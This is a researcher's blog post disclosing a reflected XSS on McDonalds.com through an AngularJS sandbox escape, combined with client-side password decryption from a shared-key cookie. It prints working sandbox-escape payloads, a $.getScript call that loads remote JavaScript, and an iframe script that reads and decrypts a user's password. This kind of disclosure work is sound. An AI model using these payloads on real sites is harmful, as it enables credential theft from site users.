---
title: Stealing passwords from McDonald's users
subtitle: Reflected XSS through AngularJS sandbox bypass causes password exposure of McDonald users.
description: By abusing an insecure cryptographic storage vulnerability and a reflected server cross-site-scripting vulnerability it is possible to steal and decrypt the password from a McDonald's user.
keywords: xss, cross-site, scripting, mcdonalds, password, vulnerability, stealing, angularjs
date: 2017-01-06 00:31:42
robots: index, follow
show_in_home: true
---

By abusing an insecure cryptographic storage vulnerability ({% customlink "https://www.owasp.org/index.php/Top_10_2007-Insecure_Cryptographic_Storage" %}) and a reflected server cross-site-scripting vulnerability ({% customlink "https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" %}) it is possible to steal and decrypt the password from a McDonald's user. Besides that, other personal details like the user's name, address & contact details can be stolen too.

### Proof of Concept

#### Reflected XSS through AngularJS sandbox escape
McDonalds.com contains a search page which reflects the value of the search parameter (`q`) in the source of the page. So when we search on for example `***********-test-reflected-test-***********`, the response will look like this:

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-1" "search-value-test-preview.png" "Text on website" %}{% raw %}
		{% endraw %}{% customlightbox "step-1" "search-value-test-reflected.png" "Text in HTML" %}{% raw %}
	</div>
</div>
{% endraw %}

McDonald's uses AngularJS so we can try to print the unique scope ID using the search value. We can do this by changing the `q` parameter value to `{% raw %}{{$id}}{% endraw %}`. As we can see `{% raw %}{{$id}}{% endraw %}` gets converted to `9` the unique ID (monotonically increasing) of the AngularJS scope.

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-2" "search-value-angular-id-preview.png" "Unique ID on website" %}{% raw %}
		{% endraw %}{% customlightbox "step-2" "search-value-angular-id-reflected.png" "Unique ID in HTML" %}{% raw %}
	</div>
</div>
{% endraw %}

Using `{% raw %}{{alert(1)}}{% endraw %}` as value wouldn't work because all AngularJS code is executed in a sandbox. However, the AngularJS sandbox isn't really safe. In fact, it shouldn't be trusted at all. It even got removed in version 1.6 ({% customlink "https://docs.angularjs.org/guide/security#sandbox-removal" %}) because it gave a false sense of security. PortSwigger created a nice blog post about escaping the AngularJS sandbox ({% customlink "http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html" %}).

We first need to find the AngularJS version of McDonalds.com. We can do this by executing `angular.version` in the console.

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-3" "angular-version.png" "Angular version" %}{% raw %}
	</div>
</div>
{% endraw %}

The version is 1.5.3, so the sandbox escape we need is `{% raw %}{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}{% endraw %}`. We can use this sandbox escape as search value, which results in an alert.

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-4" "alert-1-in-chrome.png" "Alert using AngularJS sandbox escape" %}{% raw %}
	</div>
</div>
{% endraw %}

We can even load external JavaScript files using the following sandbox escape, which results in the alert below.

`{% raw %}{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://tij.me/snippets/external-alert.js`)');}}{% endraw %}`

The JavaScript can be loaded from another domain since McDonald's doesn't exclude it using the `Content-Security-Policy` header.

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-5" "alert-external-in-chrome.png" "External domain alert using AngularJS sandbox escape" %}{% raw %}
	</div>
</div>
{% endraw %}

### Proof of Concept

#### Stealing the user's password
Another thing I noticed on McDonalds.com was their sign in page which contained a very special checkbox. Normally you can check "Remember me" when signing in, but the McDonald's sign in page gives us the option to remember the password.

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-6" "mcdonalds-login-form.png" "Remember my password checkbox" %}{% raw %}
	</div>
</div>
{% endraw %}

I searched through all the JavaScript for the keyword `password` and I found some interesting code that decrypts the password.

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-7" "source-search-password.png" "Source code search for `password`" %}{% raw %}
		{% endraw %}{% customlightbox "step-7" "cookie-pass-decrypt-source.png" "Source for decrypting the user's password" %}{% raw %}
	</div>
</div>
{% endraw %}

If there's one thing you shouldn't do, it's decrypting passwords client side (or even storing passwords using two-way encryption). I tried to run the code myself, and it worked!

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-8" "decrypt-get-cookie-penc.png" "Decrypting my password using the console" %}{% raw %}
	</div>
</div>
{% endraw %}

The `penc` value is a cookie that is stored for a year. LOL!

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-9" "penc-cookie.png" "The `penc` cookie that is stored for a year" %}{% raw %}
	</div>
</div>
{% endraw %}

McDonald's uses CryptoJS to encrypt and decrypt sensitive data. They use the same `key` and `iv` for every user, which means I only have to steal the `penc` cookie to decrypt someone's password.

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-10" "encrypt-decrypt-source.png" "Encrypting and decrypting sensitive data using CryptoJS" %}{% raw %}
	</div>
</div>
{% endraw %}

I tried decrypting my password on the search page using a malicious search payload, but it didn't work. Since the AngularJS sandbox escape payload replaces the `charAt` method with the `join` method, the `getCookie` method failed. The `getCookie` method tries to trim whitespaces from cookie values by checking if `charAt(0)` is a whitespace. In the images below you can see `.charAt(0)` returns a string joined by `0` if executed on the search page.

{% raw %}
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-11" "char-at-fail.png" "The `charAt` method on the search page (fails)" %}{% raw %}
		{% endraw %}{% customlightbox "step-11" "char-at-success.png" "The `charAt` method on the homepage (success)`" %}{% raw %}
	</div>
</div>
{% endraw %}

I wrote some JavaScript that loads the homepage in an iframe and steals the cookie using that iframe. Since the payload is executed multiple times because of the sandbox escape, I keep track of the variable `xssIsExecuted`, so that the payload is only executed once.

{% highlightcode javascript %}
	if (!window.xssIsExecuted) {
	    window.xssIsExecuted = true;

	    var iframe = $('<iframe src="https://www.mcdonalds.com/us/en-us.html"></iframe>');
	    $('body').append(iframe);

	    iframe.on('load', function() {
	        var penc = iframe[0].contentWindow.getCookie('penc');
	        alert(iframe[0].contentWindow.decrypt(penc));
	    });
	}
{% endhighlightcode %}

We can now use the following sandbox escape, which results in my password in an alert box!

`{% raw %}{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://tij.me/snippets/mcdonalds-password-stealer.js`)');}}{% endraw %}`

{% raw %}
<p></p>
<div class="row img-carousel">
	<div class="col-md-12">
		{% endraw %}{% customlightbox "step-12" "alert-my-password.png" "My password!" %}{% raw %}
	</div>
</div>
{% endraw %}

That was all pretty easy. I tried to contact McDonald's multiple times to report the issue, but unfortunately they didn't respond, which is why I decided to disclose the vulnerability.
